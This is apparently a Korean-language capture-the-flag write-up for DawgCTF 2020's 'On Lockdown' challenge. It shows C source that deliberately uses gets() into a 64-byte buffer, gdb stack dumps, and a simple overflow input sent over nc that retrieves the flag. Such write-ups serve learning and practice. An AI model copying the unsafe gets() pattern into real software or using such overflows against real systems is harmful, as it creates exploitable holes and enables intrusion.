# [WriteUp]DawgCTF 2020 - On Lockdown

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Overview

### source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void flag_me(){
	system("cat flag.txt");
}

void lockdown(){
	int lock = 0;
	char buf[64];
	printf("I made this really cool flag but Governor Hogan put it on lockdown\n");
	printf("Can you convince him to give it to you?\n");
	gets(buf);
	if(lock == 0xdeadbabe){
		flag_me();
	}else{
		printf("I am no longer asking. Give me the flag!\n");
	}
}

int main(){
	lockdown();
	return 0;
}

```

`lockdown()`에서는 `gets()`로 버퍼에 입력을 받는데, `lock`의 값이 `0xdeadbabe`이면 플래그를 준다.

### assembly code

```shell
gdb-peda$ pd lockdown
Dump of assembler code for function lockdown:
...
   0x56556228 <+68>:	call   0x56556030 <gets@plt>
   0x5655622d <+73>:	add    esp,0x10
   0x56556230 <+76>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x56556234 <+80>:	je     0x5655623d <lockdown+89>
   0x56556236 <+82>:	call   0x565561b9 <flag_me>
...
End of assembler dump.
```

왜인지 모르겠는데 어셈블리로 보면 약간 다르다. `ebp-0xc`에 저장된 값이 0이 아니면 플래그를 준다.

---

## Exploit plan

```shell
gdb-peda$ r
Starting program: /home/dr-nibe/DawgCTF2020/onlockdown 
I made this really cool flag but Governor Hogan put it on lockdown
Can you convince him to give it to you?
aaaa
...
Breakpoint 1, 0x5655622d in lockdown ()
gdb-peda$ x/40wx $esp
0xffffd0e0:	0xffffd0fc	0x00000000	0x00000000	0x565561f0
0xffffd0f0:	0x56556080	0xffffd1f4	0xf7fb4000	0x61616161
0xffffd100:	0xf7fb2a00	0x00080000	0xf7fb4000	0xf7fb7c88
0xffffd110:	0xf7fb4000	0xf7fe39f0	0x00000000	0xf7e03552
0xffffd120:	0xf7fb43fc	0x56558fd0	0xffffd1fc	0x565562c3
0xffffd130:	0x00000001	0xffffd1f4	0xffffd1fc	0x00000000
0xffffd140:	0xf7fe39f0	0x00000000	0xffffd158	0x5655626a
0xffffd150:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7de9fb9
0xffffd160:	0x00000001	0xffffd1f4	0xffffd1fc	0xffffd184
0xffffd170:	0xf7fd3aa0	0xf7ffd000	0xf7fb4000	0x00000000
gdb-peda$ i r ebp
ebp            0xffffd148          0xffffd148
```

`gets()`에 입력으로 `"aaaa"`를 줬을 때 스택의 상태이다. `0xffffd0fc`에 입력한 문자열이 들어가 있는 것을 확인할 수 있다. `ebp-0xc`는 `0xffffd13c`이다. 지금은 0이 들어가 있다. `gets()`에서 `0x40`바이트보다 긴 문자열을 입력하면 `0xffffd13c`를 넘어가게 되어 플래그를 얻을 수 있을 것이다.

---

## Exploit

```shell
dr-nibe@ubuntu:~/DawgCTF2020$ nc ctf.umbccd.io 4500
I made this really cool flag but Governor Hogan put it on lockdown
Can you convince him to give it to you?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
DawgCTF{s3ri0u$ly_st@y_h0m3}
```

